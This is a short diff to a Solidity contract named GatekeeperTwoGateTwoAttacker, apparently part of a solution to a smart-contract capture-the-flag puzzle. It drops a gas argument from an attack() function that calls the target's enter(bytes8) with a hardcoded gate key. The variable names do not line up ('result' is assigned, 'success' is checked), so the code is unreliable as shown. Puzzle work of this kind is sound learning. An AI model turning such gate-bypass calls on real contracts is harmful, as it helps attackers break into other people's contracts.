@@ -14,8 +14,8 @@ contract GatekeeperTwoGateTwoAttacker {
         gateKey = 0x0000000100005df6;
     }
 
-    function attack(uint64 gasToUse) public {
-        (result, ) = gatekeeperTwoAddress.call{gas: gasToUse + i}(
+    function attack() public {
+        (result, ) = gatekeeperTwoAddress.call(
             abi.encodeWithSignature("enter(bytes8)", gateKey)
         );
         require(success, "Attack failed");
